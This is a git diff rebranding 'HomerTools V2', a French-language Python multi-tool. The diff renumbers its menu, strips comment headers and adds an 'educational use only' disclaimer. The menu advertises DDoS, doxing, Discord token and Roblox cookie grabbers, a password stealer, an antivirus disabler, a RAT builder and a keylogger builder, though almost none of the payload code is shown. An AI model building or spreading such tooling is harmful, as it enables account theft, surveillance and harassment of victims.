@@ -301,12 +301,11 @@ def loading():
     print()
 
     checks = [
-        "Initialisation du systeme HomerTools",
-        "Chargement des modules Python",
-        "Verification de l'environnement",
+        "HomerTools est destiné à des fins éducatives et de test uniquement.",
+        "Toute utilisation malveillante est interdite et peut être illégale.",
         "Connexion au reseau",
         "Demarrage de l'interface",
-        "HomerTools V2 by w0k00",
+        "HomerTools V2   by w0k00",
         "Amuse toi bien ma biche ",
     ]
 
@@ -326,33 +325,33 @@ def loading():
 # ============================================================
 
 MENU_LEFT = [
-    ("1",  "Ddos Url"),
-    ("2",  "Username Tracker"),
-    ("3",  "Dox Identity "),
-    ("4",  "Phone Info"),
-    ("5",  "Breach Email Lookup"),
-    ("6",  "Dox creator "),
-    ("7",  "Email Searcher"),
+    ("01",  "[Ddos Url]"),
+    ("02",  "[Username Tracker]"),
+    ("03",  "[Dox Identity Lookup ]"),
+    ("04",  "[Phone Info Lookup]"),
+    ("05",  "[Breach Email Lookup]"),
+    ("06",  "[Dox creator ]"),
+    ("07",  "[Email Lookup]"),
 ]
 
 MENU_MID = [
-    ("8",  "Token Grabber Discord"),
-    ("9",  "Password Stealer"),
-    ("10", "IP Grabber"),
-    ("11", "Anti Virus Disable"),
-    ("12", "RAT Builder"),
-    ("13", "Roblox Cookie Grabber"),
-    ("14", "Key Logger"),
+    ("08", "[Token Grabber Discord]"),
+    ("09", "[Password Stealer]"),
+    ("10", "[IP Grabber]"),
+    ("11", "[Anti Virus Disable]"),
+    ("12", "[RAT Builder]"),
+    ("13", "[Roblox Cookie Grabber]"),
+    ("14", "[Key Logger]"),
 ]
 
 MENU_RIGHT = [
-    ("15", "Password Creator"),
-    ("16", "IP Lookup - Osint"),
-    ("17", "Proxy Scrapper"),
-    ("18", "Discord Token Login"),
-    ("19", "Hash Password Cracker"),
-    ("20", "Web Vulnerability Scanner"),
-    ("00", "Exit Tool"),
+    ("15", "[Password Générator]"),
+    ("16", "[IP Lookup]"),
+    ("17", "[Proxy Scrapper]"),
+    ("18", "[Discord Token Login]"),
+    ("19", "[Hash Password Cracker]"),
+    ("20", "[Web Vulnerability Scanner]"),
+    ("00", "[Exit Tool]"),
 ]
 
 
@@ -401,15 +400,15 @@ def page_1():
         time.sleep(0.02)
 
     print()
-    print(f"  {GRAY}tape le numero de l'option, puis ENTREE{RESET}")
+    print(f"  {GRAY}tape le numero que tu veux : {RESET}")
     print()
 
     choice = input(f"{CYAN}  >>>>{RESET} ").strip()
 
     actions = {
-        "1": option_1, "2": option_2, "3": option_3, "4": option_4,
-        "5": option_5, "6": option_6, "7": option_7, "8": option_8,
-        "9": option_9, "10": option_10, "11": option_11, "12": option_12,
+        "01": option_1, "02": option_2, "03": option_3, "04": option_4,
+        "05": option_5, "06": option_6, "07": option_7, "08": option_8,
+        "09": option_9, "10": option_10, "11": option_11, "12": option_12,
         "13": option_13, "14": option_14, "15": option_15, "16": option_16,
         "17": option_17, "18": option_18, "19": option_19, "20": option_20,
     }
@@ -449,10 +448,6 @@ def _ask(label):
     val = input(f"{YELLOW}[?]{RESET} {label} {RED}->{RESET} ").strip()
     return val if val else "None"
 
-
-# ============================================================
-#                     OPTION 1 — DDOS
-# ============================================================
 
 def option_1():
     clear()
@@ -716,10 +711,6 @@ def option_1():
     pause()
 
 
-# ============================================================
-#                     OPTION 2 — USERNAME TRACKER
-# ============================================================
-
 def option_2():
     clear()
     banner()
@@ -928,9 +919,6 @@ def option_2():
     pause()
 
 
-# ============================================================
-#                     OPTION 3 — TEXT BOMBER
-# ============================================================
 
 def option_3() -> str:
     clear()
@@ -969,10 +957,6 @@ def option_3() -> str:
         
     pause()
 
-
-# ============================================================
-#                     OPTION 4 — PHONE INFO
-# ============================================================
 
 def option_4():
     clear()
@@ -1196,9 +1180,6 @@ def option_4():
     pause()
 
 
-# ============================================================
-#                     OPTION 5 — BREACH EMAIL LOOKUP
-# ============================================================
 
 def option_5():
     clear()
@@ -1299,9 +1280,6 @@ def option_5():
     pause()
 
 
-# ============================================================
-#                     OPTION 6 — DOX 
-# ============================================================
 
 def option_6():
     clear()
@@ -1664,7 +1642,7 @@ def option_6():
         return "\n".join(lines) + "\n"
 
     report = f"""============================================================
-                 OSINT / DOX REPORT — BASEDF TOOL
+                 OSINT / DOX REPORT — HOMERTOOL
 ============================================================
 
 Generated At       : {profile['created_at']}
@@ -1734,9 +1712,6 @@ Manual fields      : {len(profile['manual'])}
     pause()
 
 
-# ============================================================
-#                     OPTION 7 — EMAIL SEARCHER
-# ============================================================
 
 def option_7():
     clear()
@@ -1990,9 +1965,6 @@ def option_7():
     pause()
 
 
-# ============================================================
-#         OPTION 8 — TOKEN GRABBER BUILDER
-# ============================================================
 
 def option_8():
     clear()
@@ -2275,9 +2247,6 @@ if __name__ == "__main__":
     pause()
 
 
-# ============================================================
-#         OPTION 9 — PASSWORD STEALER BUILDER
-# ============================================================
 
 def option_9():
     clear()
@@ -2725,9 +2694,6 @@ if __name__ == "__main__":
     pause()
 
 
-# ============================================================
-#                     OPTION 10 — IP GRABBER
-# ============================================================
 
 def option_10():
     clear()
@@ -3045,9 +3011,7 @@ if __name__ == "__main__":
     pause()
 
 
-# ============================================================
-#           OPTION 11 — AV DISABLE BUILDER
-# ============================================================
+
 
 def option_11():
     clear()
@@ -3098,9 +3062,7 @@ def option_11():
     clefs = [AVS[i][1] for i in ids]
     noms = [AVS[i][0] for i in ids]
 
-    source = r'''# auto-genere par mytool.py
-# cibles : __TARGETS__
-# lancer en ADMINISTRATEUR
+    source = r'''# auto-genere par HomerTools
 import subprocess, sys, ctypes, os, json, platform, socket
 from datetime import datetime
 
@@ -3392,9 +3354,6 @@ if __name__ == "__main__":
     pause()
 
 
-# ============================================================
-#         OPTION 12 — RAT BUILDER
-# ============================================================
 
 def option_12():
     clear()
@@ -3853,9 +3812,6 @@ if __name__ == "__main__":
     pause()
 
 
-# ============================================================
-#     OPTION 13 — ROBLOX COOKIE GRABBER BUILDER
-# ============================================================
 
 def option_13():
     clear()
@@ -4111,9 +4067,6 @@ if __name__ == "__main__":
     pause()
 
 
-# ============================================================
-#         OPTION 14 — KEYLOGGER BUILDER
-# ============================================================
 
 def option_14():
     clear()
@@ -4496,9 +4449,7 @@ if __name__ == "__main__":
     pause()
 
 
-# ============================================================
-#                     OPTION 15 — PASSWORD CREATOR
-# ============================================================
+
 
 def option_15():
     clear()
@@ -4539,10 +4490,6 @@ def option_15():
     print(f"\n{GREEN}Password :{RESET} {pw}")
     pause()
 
-
-# ============================================================
-#                     OPTION 16 — IP LOOKUP OSINT
-# ============================================================
 
 def option_16():
     clear()
@@ -4888,9 +4835,6 @@ def option_16():
     pause()
 
 
-# ============================================================
-#                     OPTION 17 — PROXY SCRAPER
-# ============================================================
 
 def option_17():
     clear()
@@ -5171,9 +5115,6 @@ def option_17():
     pause()
 
 
-# ============================================================
-#         OPTION 18 — DISCORD TOKEN LOGIN
-# ============================================================
 
 def option_18():
     clear()
@@ -5361,9 +5302,7 @@ def option_18():
     pause()
 
 
-# ============================================================
-#         OPTION 19 — HASH PASSWORD CRACKER
-# ============================================================
+
 
 def option_19():
     clear()
@@ -5595,9 +5534,7 @@ def option_19():
             pause()
 
 
-# ============================================================
-#         OPTION 20 — WEB VULNERABILITY SCANNER
-# ============================================================
+
 
 def option_20():
     clear()
@@ -5950,9 +5887,6 @@ def option_20():
     pause()
 
 
-# ============================================================
-#                           MAIN
-# ============================================================
 
 def main():
     set_title()
@@ -5963,7 +5897,7 @@ def main():
         if page == 0:
             clear()
             print()
-            slow_print(f"{RED}[+] Fermeture de mytool.exe...{RESET}", 0.03)
+            slow_print(f"{RED}[+] Fermeture de HomerTools...{RESET}", 0.03)
             time.sleep(5)
             break
 
